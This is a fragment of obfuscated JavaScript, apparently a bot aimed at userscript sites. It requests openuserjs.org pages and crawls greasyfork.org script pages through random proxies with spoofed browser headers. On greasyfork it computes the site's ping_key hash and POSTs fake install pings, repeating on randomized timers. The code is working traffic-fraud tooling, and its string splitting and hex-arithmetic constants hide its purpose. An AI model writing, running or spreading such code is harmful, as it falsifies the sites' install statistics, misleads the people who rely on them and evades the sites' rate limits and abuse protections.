                'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + aH(0xd) + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origi' + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a4 ? Object['assign'](a6['headers'], {
            'te': 'trailers'
          }) : Object['assign'](a6['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a5 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const a7 = await fetch(X, a6)['catch'](aa => {});
          if (!a7 || !a7['headers'])
            return;
          if (null === a7['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const a8 = {
            'signal': AbortSignal['timeout'](0x11 * -0x75 + -0x7 * 0x1cd + 0x30 * 0x13d),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': a3,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': aH(0x1) + '=0.9',
              'cache-control': 'no-cache',
              'pragma': aH(0x10),
              'referer': X,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a4 ? Object['assign'](a8['headers'], {
              'te': 'trailers'
            }) : Object['assign'](a8['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a5 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a1, a8)['catch'](aa => {}))
            return;
          const a9 = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a4 ? Object['assign'](a9['headers'], {
            'te': 'trailers'
          }) : Object['assign'](a9['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a5 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a2, a9);
        }
        a0();
        for (let a1 = -0x6b6 + -0x4bb * 0x2 + 0x33c * 0x5; a1 < 0x1 * -0x2689 + -0x73b * 0x2 + 0x3503; a1++)
          setTimeout(a0, (0x194 * 0x3 + 0x1ca4e + -0xe4aa) * a1 * getRandomInt(-0x121 * -0x15 + -0xa19 + -0x3 * 0x489, 0xe1c + 0x15 * -0xf5 + 0x600));
        setInterval(() => {
          a0();
          for (let a2 = -0x19d5 + 0x933 + 0x10a2; a2 < -0x569 + -0x1 * 0x32 + -0x1 * -0x59f; a2++)
            setTimeout(a0, (-0xa37 * 0x1d + -0x17a1 + 0x22a3c) * a2 * getRandomInt(-0x1 * -0x1bb3 + 0x1680 + -0x19 * 0x202, -0xc9c + 0x23bd * -0x1 + -0xa * -0x4d6));
        }, -0x73 * -0xeb93 + -0x2cfc23 * 0x2 + 0x2713bd);
      }
    } catch (a2) {
      warn(a2);
    }
    break;
  }
}();
const actions = [
  [
    () => flags['doGF'],
    async () => {
      async function f(j = null, k = -0x8c + 0x2 * -0x7a0 + -0x151 * -0xc) {
        const aI = c,
          m = makeFetchCookie(fetch),
          q = j ? new HttpsProxyAgent(j) : j,
          u = await m('https://gr' + 'easyfork.o' + 'rg/en', {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'cross-site'
            },
            'method': 'GET',
            'mode': 'cors',
            'agent': q
          }),
          v = extractLinks(await u['text']())['filter'](D => D['includes']('by-site'))['slice'](0x2136 + 0x8e * -0x17 + -0x1474, -(0xec5 + -0x2 * -0x207 + -0x12d2)),
          w = k && data['scriptTarg' + 'ets']['random'](),
          x = k ? w['preRef'] : v['random'](),
          y = await m(x, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': aI(0xa) + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
            'method': 'GET',
            'mode': 'cors',
            'agent': q
          }),
          z = extractLinks(await y['text']())['filter'](D => D['includes']('/scripts/') && !D['includes']('by-site'))['slice'](-0xab9 + -0x1dcc + 0x2886),
          A = k ? w['url'] : z['random'](),
          B = await m(A, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': x,
            'method': 'GET',
            'mode': 'cors',
            'agent': q
          }),
          C = extractAnchorData(await B['text']());
        if (C['pingUrl']) {
          const D = sha1(C['ipAddress'] + C['scriptId'] + C['pingKey']),
            E = C['pingUrl'] + (C['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(D);
          await m('https://gr' + 'easyfork.o' + 'rg' + E + '&mo=3', {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origi' + 'n'
            },
            'referrer': A,
            'method': 'POST',
            'mode': 'cors',
            'agent': q
          });
        } else
          warn('awdiwajdwj' + 'qdqw');
      }
      async function g() {
        const h = await getRandomProxy();
        await f(h, 0x1 * 0x1949 + -0x4ff + -0x144a * 0x1), random() <= 0x131e * -0x1 + -0x1211 + 0x252f + 0.6 && await f(h, 0x1e37 + -0xc27 + -0x43 * 0x45);
      }
      g();
      for (let h = 0x570 + 0x2 * -0xf2a + 0x18e4; h < -0x14b * 0x19 + -0xb36 + 0x2b8d; h++)
        setTimeout(g, (-0x4f * 0x481 + 0x1455c + 0xd * 0x145f) * h * getRandomInt(-0x9 * 0x272 + 0x23 * 0xfb + -0xc4e, 0x18b * -0x5 + 0x150 + -0x2 * -0x335));
      setInterval(() => {
        g();
        for (let i = -0x1 * -0x14a7 + -0x57 * 0x17 + -0xcd6 * 0x1; i < -0x1 * 0xbcc + -0x2 * 0xcb4 + 0x2538; i++)
          setTimeout(g, (-0x67 * -0x26e + 0xb * -0x21fb + 0x7 * 0x3321) * i * getRandomInt(-0x6be + 0x1b33 + -0x1474, 0x6 * -0x33f + -0x1595 + 0x2912 * 0x1));
      }, -0x1283f5b + -0x2191545 + 0x4c1da20);
    }
  ]
];
for (let e of actions)
  try {
    e[0x1362 + -0x138b * -0x1 + 0x1 * -0x26ed]() && setTimeout(e[0x4fa * -0x7 + 0xb5a + -0x177d * -0x1]);
  } catch (av) {
    warn(av);
  }

function a() {
  const c7 = [
    'board&utm_',
    'zw4TvvmSzw47Cq',
    ',\x20like\x20Gec',
    'W7JcM8oavM4hW6xcVmkbWQi',
    'C2LTs2v5yM9HCG',
    'easyfork.o',
    'z0TNrMLfz2DOEq',
    'tSojg8kjbSoSw8o0Cf4',
    'e/youtube.',
    '-diep-io-a',
    'C2fTzs1VCMLNAq',
    'W6XTnCoIW50cxfaLWRC',
    'pbtcLSkjWPJcS8orASkmvq',
    'BgLJyxrPB24VCW',
    'W7/dUL/cRhKTW7zxag0',
    'DgfI',
    'BM8Ty2fJAgu',
    'CMCVzw4VC2nYAq',
    'minecraft,',
    'zxr0BgLUzY1MDa',
    'W5JdJsJcImo9WQJdN8oOW4CI',
    'sg0XwuzZEKPxyG',
    'pmoMWO03W6rBbcFdIJu',
    'CMfPzgLUzYbIyq',
    'Ahr0Chm6lY9NCG',
    'Y8DzpdFZZ8',
    's_All_Shor',
    'ngzMyZiWmJqWmW',
    'B3jLl1LVDvr1yG',
    'WOOSWRJdRc7dTghcIYv+',
    '78dymyg88r',
    'CMfUzg9T',
    'C3LUxZuYntiZlW',
    'zs95B3v0DwjLlG',
    'mcaOtgLUDxG7ia',
    'lymer-disa',
    'b8kgW74eW5HuWPa',
    'WRysWR3cVmoRpxNdSW7cJG'
  ];
  a = function() {
    return c7;
  };
  return a();
}